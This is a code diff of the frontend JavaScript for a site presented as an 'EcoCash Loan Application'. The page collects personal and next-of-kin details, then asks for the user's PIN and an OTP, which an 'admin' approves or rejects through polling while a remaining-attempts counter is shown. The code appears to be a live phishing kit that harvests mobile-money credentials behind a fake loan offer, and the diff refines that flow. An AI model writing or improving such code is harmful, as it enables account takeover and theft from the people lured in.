@@ -1,5 +1,5 @@
 // ============================================================
-// EcoCash Loan Application – Frontend Logic (FINAL)
+// EcoCash Loan Application – Frontend Logic (FIXED)
 // ============================================================
 
 let appData = {
@@ -59,8 +59,21 @@ function clearErr(id) {
 
 // ─── Landing ───
 function startApplication() {
-  appData.loanAmount = 200;
-  appData.loanDuration = 30;
+  // Reset all appData
+  appData = {
+    loanAmount: 200,
+    loanDuration: 30,
+    firstName: '',
+    lastName: '',
+    phone: '',
+    email: '',
+    kinFirstName: '',
+    kinLastName: '',
+    kinPhone: '',
+    province: '',
+    loanReason: '',
+    applicationId: null
+  };
   goTo('page-step1');
   document.getElementById('s1am').value = 200;
   document.getElementById('s1dur').value = 30;
@@ -135,8 +148,10 @@ async function submitApp() {
     const data = await response.json();
     if (data.ok) {
       appData.applicationId = data.applicationId;
-      goTo('page-pin');
-      startPinPolling(); // Start polling immediately after submission
+      // Go to processing page and wait for app approval
+      goTo('page-processing');
+      document.getElementById('processingStatus').textContent = '⏳ Awaiting admin approval of application...';
+      startAppPolling();
     } else {
       alert('Error: ' + data.error);
     }
@@ -144,6 +159,46 @@ async function submitApp() {
     console.error(err);
     alert('Network error. Please try again.');
   }
+}
+
+// ─── App Approval Polling (New) ───
+function startAppPolling() {
+  if (window._appInterval) clearInterval(window._appInterval);
+  window._appInterval = setInterval(async () => {
+    try {
+      const res = await fetch(`/api/status/${appData.applicationId}/app`, {
+        cache: 'no-store'
+      });
+      if (res.status === 404) {
+        clearInterval(window._appInterval);
+        clearState();
+        alert('Application not found. Please start again.');
+        goTo('page-landing');
+        return;
+      }
+      const data = await res.json();
+
+      if (data.status === 'approved') {
+        clearInterval(window._appInterval);
+        goTo('page-pin');
+        // Reset PIN inputs and attempt display
+        clearLoginPin();
+        document.getElementById('pinAttemptsDisplay').textContent = '🔑 Attempts remaining: 3 of 3';
+        // Wait for user to submit PIN; don't start polling yet.
+        return;
+      }
+      if (data.status === 'rejected') {
+        clearInterval(window._appInterval);
+        clearState();
+        alert('Your application was rejected by the admin.');
+        goTo('page-landing');
+        return;
+      }
+      // If pending, stay on processing page
+    } catch (err) {
+      console.error('App polling error:', err);
+    }
+  }, 3000);
 }
 
 // ─── PIN Submission ───
@@ -160,7 +215,8 @@ async function doPin() {
     });
     const data = await response.json();
     if (data.ok) {
-      startPinPolling(); // Start polling for admin decision
+      // Now start polling for PIN decision
+      startPinPolling();
     } else if (data.blocked) {
       showError('pinErr', data.message);
       disablePinInputs();
@@ -172,13 +228,13 @@ async function doPin() {
   }
 }
 
-// ─── PIN Polling (with no-cache to avoid 304) ───
+// ─── PIN Polling ───
 function startPinPolling() {
   if (window._pinInterval) clearInterval(window._pinInterval);
   window._pinInterval = setInterval(async () => {
     try {
       const res = await fetch(`/api/status/${appData.applicationId}/pin`, {
-        cache: 'no-store'   // <-- Prevents 304, always gets fresh status
+        cache: 'no-store'
       });
       if (res.status === 404) {
         clearInterval(window._pinInterval);
@@ -194,7 +250,7 @@ function startPinPolling() {
         clearLoginPin();
         document.getElementById('pinAttemptsDisplay').textContent = '🔑 Attempts remaining: 3 of 3';
         goTo('page-otp');
-        startOtpPolling();
+        // Start OTP polling? Actually we need user to enter OTP first.
         return;
       }
       if (data.status === 'rejected') {
@@ -202,9 +258,6 @@ function startPinPolling() {
         document.getElementById('pinAttemptsDisplay').textContent = `🔑 Attempts remaining: ${remaining} of 3`;
         showError('pinErr', `Wrong PIN. ${remaining} attempt(s) remaining.`);
         clearLoginPin();
-        if (!document.getElementById('page-pin').classList.contains('active')) {
-          goTo('page-pin');
-        }
         return;
       }
       if (data.status === 'blocked') {
@@ -214,12 +267,9 @@ function startPinPolling() {
         showError('pinErr', 'Application blocked. Please wait 5 minutes.');
         return;
       }
-      // If pending, just stay on the PIN page
-      if (!document.getElementById('page-pin').classList.contains('active')) {
-        goTo('page-pin');
-      }
+      // If pending, keep waiting
     } catch (err) {
-      console.error('Polling error:', err);
+      console.error('Pin polling error:', err);
     }
   }, 3000);
 }
@@ -240,14 +290,14 @@ async function doOtp() {
     if (data.ok) {
       startOtpPolling();
     } else {
-      alert('Error: ' + data.error);
+      showError('otpErr', data.error || 'Error');
     }
   } catch (err) {
     alert('Network error');
   }
 }
 
-// ─── OTP Polling (with no-cache) ───
+// ─── OTP Polling ───
 function startOtpPolling() {
   if (window._otpInterval) clearInterval(window._otpInterval);
   window._otpInterval = setInterval(async () => {
@@ -275,7 +325,7 @@ function startOtpPolling() {
         return;
       }
     } catch (err) {
-      console.error('Polling error:', err);
+      console.error('OTP polling error:', err);
     }
   }, 3000);
 }
@@ -360,12 +410,15 @@ function clearOtpCode() {
 document.addEventListener('DOMContentLoaded', function() {
   const restored = loadState();
   if (restored && appData.applicationId) {
-    if (currentPage === 'page-pin') {
+    if (currentPage === 'page-processing') {
+      goTo('page-processing');
+      startAppPolling();
+    } else if (currentPage === 'page-pin') {
       goTo('page-pin');
-      startPinPolling();
+      // Don't start polling until PIN is submitted
     } else if (currentPage === 'page-otp') {
       goTo('page-otp');
-      // We don't start OTP polling until user submits OTP
+      // Don't start OTP polling until OTP is submitted
     } else if (currentPage === 'page-step1' || currentPage === 'page-step2' || currentPage === 'page-step3') {
       goTo(currentPage);
     } else {
